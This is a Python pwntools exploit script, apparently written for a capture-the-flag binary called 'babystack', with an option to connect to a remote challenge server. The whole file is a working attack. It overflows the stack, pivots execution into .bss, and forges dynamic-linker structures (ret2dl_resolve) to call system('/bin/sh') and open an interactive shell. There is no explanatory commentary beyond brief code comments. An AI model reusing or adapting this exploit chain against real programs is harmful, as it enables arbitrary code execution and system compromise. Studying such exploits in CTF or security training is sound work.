#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
"""
sys.path.append("/home/tree/pwntools/roputils")
from roputils import *
"""

context.binary = './babystack'
context.log_level = 'debug'
context.timeout = None
binary = context.binary
libc = context.binary.libc

def dbg():
	raw_input()
if args['REMOTE']:
	p = remote('47.106.94.13', 50025)

else:
	p = process('./babystack')
	#gdb.attach(p, 'b* 0x08048455')
	dbg()

def ret2dl_resolve_x86(ELF_obj,func_name,resolve_addr,fake_stage,do_slim=1):
    jmprel = ELF_obj.dynamic_value_by_tag("DT_JMPREL")#rel_plt
    relent = ELF_obj.dynamic_value_by_tag("DT_RELENT")
    symtab = ELF_obj.dynamic_value_by_tag("DT_SYMTAB")#dynsym
    syment = ELF_obj.dynamic_value_by_tag("DT_SYMENT")
    strtab = ELF_obj.dynamic_value_by_tag("DT_STRTAB")#dynstr
    versym = ELF_obj.dynamic_value_by_tag("DT_VERSYM")#version
    plt0 = ELF_obj.get_section_by_name('.plt').header.sh_addr

    p_name = fake_stage+8-strtab
    len_bypass_version = 8-(len(func_name)+1)%0x8
    sym_addr_offset = fake_stage+8+(len(func_name)+1)+len_bypass_version-symtab

    if sym_addr_offset%0x10 != 0:
        if sym_addr_offset%0x10 == 8:
            len_bypass_version+=8
            sym_addr_offset = fake_stage+8+(len(func_name)+1)+len_bypass_version-symtab
        else:
            error('something error!')

    fake_sym = sym_addr_offset/0x10

    while True:
        fake_ndx = u16(ELF_obj.read(versym+fake_sym*2,2))
        if fake_ndx != 0:
            fake_sym+=1
            len_bypass_version+=0x10
            continue
        else:
            break


    if do_slim:
        slim = len_bypass_version - len_bypass_version%8
        version = len_bypass_version%8
        resolve_data,resolve_call=ret2dl_resolve_x86(ELF_obj,func_name,resolve_addr,fake_stage+slim,0)
        return (resolve_data,resolve_call,fake_stage+slim)

    fake_r_info = fake_sym<<8|0x7
    reloc_offset=fake_stage-jmprel

    resolve_data = p32(resolve_addr)+p32(fake_r_info)+func_name+'\x00'
    resolve_data += 'a'*len_bypass_version
    resolve_data += p32(p_name)+p32(0)+p32(0)+p32(0x12)

    resolve_call = p32(plt0)+p32(reloc_offset)

    return (resolve_data,resolve_call)


stage = binary.bss()
dl_data,dl_call,stage = ret2dl_resolve_x86(binary,'system',binary.bss()+0x200,stage)

#rop information
read_plt = 0x08048300 
bss_buf = 0x0804A020
leave_ret = 0x08048455

pop_3_ret = 0x080484e9 		# pop esi ; pop edi ; pop ebp ; ret
pop_ebp_ret = 0x080484eb 	# pop ebp ; ret

#stack poivt and read(0, bss, 0x1000)
payload = 'a'*0x28
payload += p32(bss_buf)		#ebp ==> bss_buf
payload += p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss_buf) + p32(0x36)
p.send(payload)

dbg()

payload = 'a'*0x4 							#read(0, bss_buf = ebp, 0x1000), 		while ebp+4 is ret_addr
payload += p32(read_plt) + p32(pop_3_ret) + p32(0) + p32(dl_data) + p32(0x1000)
payload += p32(pop_ebp_ret) + p32(dl_data)		#ebp = control_base, so ret_addr is at control_base+4 which is plt_0
payload += p32(leave_ret)


p.send(payload)
sleep(1)
p.send(dl_data + "/bin/sh\x00")


p.interactive()

